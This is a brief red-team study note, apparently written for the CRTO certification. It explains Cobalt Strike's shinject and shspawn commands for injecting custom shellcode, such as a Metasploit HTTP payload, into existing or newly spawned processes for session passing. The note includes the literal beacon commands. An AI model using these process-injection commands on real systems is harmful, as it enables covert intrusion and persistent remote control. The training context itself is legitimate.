
Cobalt Strike has two further generic injection commands that can be utilised for the purpose of session passing: `shinject` and `shspawn`.  

Both allow you to inject an arbitrary (custom) shellcode blob - shinject can inject into an existing process, and shspawn will spawn a new process.

## 🖊️ Usage

1) Create your raw shellcode which will produce a .bin file
2) Inject a process either with one of the mentioned commands:

Spawns a new process and injects the custom shellcode
`beacon> shspawn x64 C:\Payloads\msf_http_x64.bin`

Injects the raw shellcode into a process you choose
`beacon> shinject [PID] x64 C:\Payloads\msf_http_x64.bin`



### ⚠ Opsec




### Properties
---
📆 created   {{17-02-2024}} 16:34
🏷️ tags: #redteam #crto 

---

